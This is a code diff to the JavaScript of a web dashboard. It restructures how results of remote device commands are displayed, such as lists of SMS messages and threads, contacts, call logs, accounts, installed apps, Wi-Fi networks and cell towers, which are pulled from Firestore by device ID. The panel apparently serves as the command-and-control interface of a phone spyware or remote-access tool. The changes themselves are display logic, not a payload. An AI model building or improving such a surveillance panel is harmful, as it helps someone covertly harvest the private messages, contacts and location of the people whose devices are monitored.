@@ -869,7 +869,7 @@
         <div class="modal-box wide">
             <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px;">
                 <div>
-                    <h3 id="rdTitle">📄 Result Detail</h3>
+                    <h3 id="rdTitle">📄 Item Detail</h3>
                     <p id="rdMeta" style="margin-bottom:0;"></p>
                 </div>
                 <button class="btn btn-ghost btn-sm" onclick="closeResultDetail()">✕ Close</button>
@@ -2263,15 +2263,13 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  FORMAT RESULTS — Structured output for SMS, apps, contacts, etc.
+    //  FORMAT RESULTS — THE KEY FIX: Unified structured view
     // ═══════════════════════════════════════════════════════
     function formatResultOutput(action, output) {
         if (!output || output === '—') return escapeHtml(output);
 
-        // Try to parse and structure the output based on action type
         const rawHtml = escapeHtml(String(output));
 
-        // Actions that benefit from structured display
         const structActions = ['list_sms', 'get_sms_threads', 'get_contacts', 'get_call_log',
                               'get_installed_apps', 'get_running_apps', 'get_accounts',
                               'list_directory', 'get_wifi_networks', 'get_cell_towers',
@@ -2279,89 +2277,139 @@
 
         if (!structActions.includes(action)) return rawHtml;
 
+        // ── Try JSON parse first ──
         let parsed = null;
-        // Try JSON parse
         try {
             if (typeof output === 'string') parsed = JSON.parse(output);
             else if (typeof output === 'object') parsed = output;
         } catch(e) {}
 
-        if (!parsed) {
-            // For list_sms without JSON, try to show as structured if line-based
-            if (action === 'list_sms' && typeof output === 'string') {
-                const lines = output.split('\n').filter(l => l.trim());
-                if (lines.length > 1) {
-                    let html = '<div class="ri-structured" style="max-height:250px;">';
-                    lines.forEach((line, i) => {
-                        // Try to parse SMS format: from|body|date or similar
-                        const parts = line.split(/[|,]/);
-                        if (parts.length >= 2) {
-                            html += `<div class="struct-row"><span class="struct-key">#${i+1}</span><span class="struct-val">${escapeHtml(line)}</span></div>`;
-                        } else {
-                            html += `<div class="struct-row"><span class="struct-key">#${i+1}</span><span class="struct-val">${escapeHtml(line)}</span></div>`;
-                        }
-                    });
-                    html += '</div>';
-                    return html + '<div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
-                }
+        if (parsed) {
+            // JSON array → structured table
+            if (Array.isArray(parsed)) {
+                if (parsed.length === 0) return '<span style="color:#6b7280;">(empty list)</span>';
+                let html = `<div class="ri-structured"><span style="font-size:10px;color:#5a6070;display:block;margin-bottom:4px;">📋 ${parsed.length} items</span>`;
+                parsed.forEach((item, idx) => {
+                    if (typeof item === 'object') {
+                        const keys = Object.keys(item);
+                        html += `<div class="struct-row" style="cursor:pointer;" onclick='showResultDetail(${escapeHtml(JSON.stringify(item))})'>`;
+                        html += `<span class="struct-key" style="min-width:30px;">#${idx+1}</span>`;
+                        const previewKeys = keys.slice(0, 3);
+                        previewKeys.forEach((k, ki) => {
+                            const v = String(item[k] || '').slice(0, 60);
+                            if (k.toLowerCase().includes('body') || k.toLowerCase().includes('text')) {
+                                html += `<span class="struct-val sms-text">${escapeHtml(v)}</span>`;
+                            } else {
+                                html += `<span class="struct-val">${escapeHtml(v)}${ki < previewKeys.length-1 ? ' · ' : ''}</span>`;
+                            }
+                        });
+                        if (keys.length > 3) html += `<span class="struct-val" style="color:#6c5ce7;">+${keys.length-3} fields</span>`;
+                        html += `</div>`;
+                    } else {
+                        html += `<div class="struct-row"><span class="struct-key">#${idx+1}</span><span class="struct-val">${escapeHtml(String(item))}</span></div>`;
+                    }
+                });
+                html += '</div>';
+                html += '<div class="struct-toggle" onclick="showRawResult(this)">Show raw JSON</div>';
+                return html;
             }
-            return rawHtml;
+
+            // JSON object → key-value pairs
+            if (typeof parsed === 'object') {
+                let html = '<div class="ri-structured">';
+                Object.entries(parsed).forEach(([k, v]) => {
+                    const valStr = typeof v === 'object' ? JSON.stringify(v).slice(0, 100) : String(v).slice(0, 100);
+                    html += `<div class="struct-row"><span class="struct-key">${escapeHtml(k)}</span><span class="struct-val">${escapeHtml(valStr)}</span></div>`;
+                });
+                html += '</div>';
+                html += '<div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
+                return html;
+            }
         }
 
-        // If it's an array, render as structured table
-        if (Array.isArray(parsed)) {
-            if (parsed.length === 0) return '<span style="color:#6b7280;">(empty list)</span>';
-            let html = `<div class="ri-structured"><span style="font-size:10px;color:#5a6070;display:block;margin-bottom:4px;">📋 ${parsed.length} items</span>`;
-            parsed.forEach((item, idx) => {
-                if (typeof item === 'object') {
-                    const keys = Object.keys(item);
-                    html += `<div class="struct-row" style="cursor:pointer;" onclick="showResultDetail('${escapeHtml(JSON.stringify(item))}')">`;
-                    html += `<span class="struct-key" style="min-width:30px;">#${idx+1}</span>`;
-                    // Show first 2-3 fields as preview
-                    const previewKeys = keys.slice(0, 3);
-                    previewKeys.forEach((k, ki) => {
-                        const v = String(item[k] || '').slice(0, 60);
-                        if (k.toLowerCase().includes('body') || k.toLowerCase().includes('text')) {
-                            html += `<span class="struct-val sms-text">${escapeHtml(v)}</span>`;
-                        } else {
-                            html += `<span class="struct-val">${escapeHtml(v)}${ki < previewKeys.length-1 ? ' · ' : ''}</span>`;
-                        }
-                    });
-                    if (keys.length > 3) html += `<span class="struct-val" style="color:#6c5ce7;">+${keys.length-3} fields</span>`;
-                    html += `</div>`;
+        // ═════════════════════════════════════════════════════════
+        //  NON-JSON FALLBACK — Line-based structured view
+        //  Works for ALL data types uniformly: Contacts, Installed 
+        //  Apps, Call Log, SMS Threads, Accounts, device info, etc.
+        // ═════════════════════════════════════════════════════════
+        if (typeof output === 'string') {
+            const lines = output.split('\n').filter(l => l.trim());
+
+            // Separate indexed lines [N] from summary header lines
+            const dataLines = lines.filter(l => /^\[\d+\]/.test(l.trim()));
+            const headerLines = lines.filter(l => !/^\[\d+\]/.test(l.trim()));
+
+            if (dataLines.length >= 1) {
+                let html = '<div class="ri-structured">';
+
+                // Show summary header if any (e.g. "45 apps:" or "call history:")
+                if (headerLines.length > 0) {
+                    html += `<span style="font-size:10px;color:#5a6070;display:block;margin-bottom:4px;">📋 ${escapeHtml(headerLines.join(' · '))}</span>`;
                 } else {
-                    html += `<div class="struct-row"><span class="struct-key">#${idx+1}</span><span class="struct-val">${escapeHtml(String(item))}</span></div>`;
+                    html += `<span style="font-size:10px;color:#5a6070;display:block;margin-bottom:4px;">📋 ${dataLines.length} items</span>`;
                 }
-            });
-            html += '</div>';
-            html += '<div class="struct-toggle" onclick="showRawResult(this)">Show raw JSON</div>';
-            return html;
-        }
 
-        // If it's a single object, show key-value pairs
-        if (typeof parsed === 'object') {
-            let html = '<div class="ri-structured">';
-            Object.entries(parsed).forEach(([k, v]) => {
-                const valStr = typeof v === 'object' ? JSON.stringify(v).slice(0, 100) : String(v).slice(0, 100);
-                html += `<div class="struct-row"><span class="struct-key">${escapeHtml(k)}</span><span class="struct-val">${escapeHtml(valStr)}</span></div>`;
-            });
-            html += '</div>';
-            html += '<div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
-            return html;
+                dataLines.forEach((line) => {
+                    const match = line.trim().match(/^\[(\d+)\]\s*(.*)/);
+                    if (match) {
+                        const idx = match[1];
+                        let content = match[2];
+
+                        // Split by pipe for columnar data
+                        const columns = content.split('|').map(c => c.trim()).filter(c => c);
+
+                        html += `<div class="struct-row" style="cursor:pointer;" onclick='showResultDetail(${escapeHtml(JSON.stringify(line.trim()))})'>`;
+                        html += `<span class="struct-key" style="min-width:30px;">#${idx}</span>`;
+
+                        // Show up to 3 columns; mark long last column as sms-text style
+                        const showCols = columns.slice(0, 4);
+                        showCols.forEach((col, ci) => {
+                            const isLast = ci === showCols.length - 1;
+                            const isLong = col.length > 30;
+                            if (isLast && isLong && columns.length >= 3) {
+                                html += `<span class="struct-val sms-text">${escapeHtml(col)}</span>`;
+                            } else {
+                                html += `<span class="struct-val">${escapeHtml(col)}</span>`;
+                            }
+                            if (ci < showCols.length - 1) {
+                                html += `<span class="struct-val" style="color:#5a6070;flex:0;">·</span>`;
+                            }
+                        });
+                        if (columns.length > 4) {
+                            html += `<span class="struct-val" style="color:#6c5ce7;flex:0;">+${columns.length-4}</span>`;
+                        }
+
+                        html += `</div>`;
+                    }
+                });
+
+                html += '</div>';
+                html += '<div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
+                return html;
+            }
+
+            // Fallback for non-indexed but multi-line content
+            if (lines.length >= 3) {
+                let html = '<div class="ri-structured" style="max-height:250px;">';
+                lines.forEach((line, i) => {
+                    html += `<div class="struct-row"><span class="struct-key">#${i+1}</span><span class="struct-val">${escapeHtml(line)}</span></div>`;
+                });
+                html += '</div>';
+                html += '<div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
+                return html;
+            }
         }
 
         return rawHtml;
     }
 
     function showRawResult(el) {
-        // Toggle: show raw output vs structured
         const item = el.closest('.result-item');
         if (!item) return;
         const outputDiv = item.querySelector('.ri-output');
         const structDiv = item.querySelector('.ri-structured');
         if (!outputDiv) return;
 
-        // Get the raw text from data attribute or rebuild
         if (el.textContent === 'Show raw output') {
             el.textContent = 'Show structured view';
             if (structDiv) structDiv.style.display = 'none';
@@ -2383,7 +2431,13 @@
             body.textContent = JSON.stringify(data, null, 2);
             modal.classList.add('open');
         } catch(e) {
-            toast('Could not parse detail', 'error');
+            // If it's plain text, show as-is
+            const modal = document.getElementById('resultDetailModal');
+            document.getElementById('rdTitle').textContent = '📄 Item Detail';
+            document.getElementById('rdMeta').textContent = '';
+            const body = document.getElementById('rdBody');
+            body.textContent = jsonStr;
+            modal.classList.add('open');
         }
     }
 
@@ -2477,12 +2531,10 @@
             '<tr><td colspan="5" style="text-align:center;padding:40px;"><span class="loading-spinner" style="width:18px;height:18px;border-width:2px;vertical-align:middle;margin-right:8px;"></span> Loading history…</td></tr>';
 
         try {
-            // Fetch all commands for this device
             const cmdSnap = await db.collection('commands')
                 .where('deviceId', '==', deviceId)
                 .get();
 
-            // Fetch all results
             const resultSnap = await db.collection('results').get();
 
             const resultMap = {};
@@ -2509,13 +2561,11 @@
             state.historyData = historyItems;
             state.historyFiltered = [...historyItems];
 
-            // Populate action filter
             const actionFilter = document.getElementById('histActionFilter');
             const actions = [...new Set(historyItems.map(h => h.action))].sort();
             actionFilter.innerHTML = '<option value="all">All Actions</option>' +
                 actions.map(a => `<option value="${a}">${a}</option>`).join('');
 
-            // Default sort by time desc
             state.historySortKey = 'time';
             state.historySortAsc = false;
             sortHistory('time');
@@ -2530,7 +2580,6 @@
     }
 
     function sortHistory(key) {
-        // Update arrow indicators
         ['time', 'action', 'status', 'output'].forEach(k => {
             const el = document.getElementById('sortArrow' + k.charAt(0).toUpperCase() + k.slice(1));
             if (el) {
@@ -2546,7 +2595,7 @@
             state.historySortAsc = !state.historySortAsc;
         } else {
             state.historySortKey = key;
-            state.historySortAsc = key === 'time' ? false : true; // time defaults desc
+            state.historySortAsc = key === 'time' ? false : true;
         }
 
         const sorted = [...state.historyFiltered];
@@ -2601,7 +2650,6 @@
                 ? escapeHtml(JSON.stringify(h.params)).slice(0, 80)
                 : '—';
 
-            // Truncate output for table
             const outputTruncated = h.output.length > 80
                 ? escapeHtml(h.output.slice(0, 80)) + '…'
                 : escapeHtml(h.output);
